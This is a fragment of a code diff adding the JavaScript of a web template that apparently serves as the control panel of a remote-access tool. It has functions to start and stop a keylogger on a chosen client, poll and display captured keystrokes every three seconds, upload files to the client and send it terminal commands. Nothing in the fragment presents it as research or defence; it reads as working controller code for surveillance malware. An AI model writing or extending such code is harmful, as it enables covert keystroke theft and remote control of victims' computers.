+                
+                // Start periodic log updates
+                if (keyloggerInterval) {
+                    clearInterval(keyloggerInterval);
+                }
+                keyloggerInterval = setInterval(getKeyloggerLogs, 3000);
+            })
+            .catch(error => {
+                console.error('Error starting keylogger:', error);
+                alert('Error starting keylogger');
+            });
+        }
+
+        function stopKeylogger() {
+            fetch(`/api/keylogger/{{ client.client_id }}/`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-CSRFToken': '{{ csrf_token }}'
+                },
+                body: JSON.stringify({ action: 'stop' })
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert('Keylogger stopped successfully');
+                document.getElementById('keylogger-status').textContent = 'No';
+                
+                // Stop periodic updates
+                if (keyloggerInterval) {
+                    clearInterval(keyloggerInterval);
+                    keyloggerInterval = null;
+                }
+                
+                getKeyloggerLogs();
+            })
+            .catch(error => {
+                console.error('Error stopping keylogger:', error);
+                alert('Error stopping keylogger');
+            });
+        }
+
+        function getKeyloggerLogs() {
+            fetch(`/api/keylogger/{{ client.client_id }}/`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-CSRFToken': '{{ csrf_token }}'
+                },
+                body: JSON.stringify({ action: 'get_logs' })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.logs) {
+                    document.getElementById('keylogger-output').textContent = data.logs;
+                    document.getElementById('keylogger-count').textContent = data.logs.length;
+                    
+                    // Scroll to bottom
+                    const outputElement = document.getElementById('keylogger-output');
+                    outputElement.scrollTop = outputElement.scrollHeight;
+                }
+            })
+            .catch(error => {
+                console.error('Error getting keylogger logs:', error);
+            });
+        }
+
+        function clearKeyloggerLogs() {
+            document.getElementById('keylogger-output').textContent = '';
+            document.getElementById('keylogger-count').textContent = '0';
+        }
+
+        // File Management
+        function refreshFiles() {
+            quickCommand('list_files');
+        }
+
+        function uploadFile() {
+            const fileInput = document.getElementById('fileInput');
+            const file = fileInput.files[0];
+            if (!file) return;
+
+            const formData = new FormData();
+            formData.append('file', file);
+
+            fetch(`/upload-file/{{ client.client_id }}/`, {
+                method: 'POST',
+                headers: {
+                    'X-CSRFToken': '{{ csrf_token }}'
+                },
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('File uploaded successfully');
+                    refreshFiles();
+                }
+            });
+        }
+
+        // Enter key event for terminal
+        document.getElementById('commandInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                sendCommand();
+            }
+        });
+    </script>
+</body>
+</html>
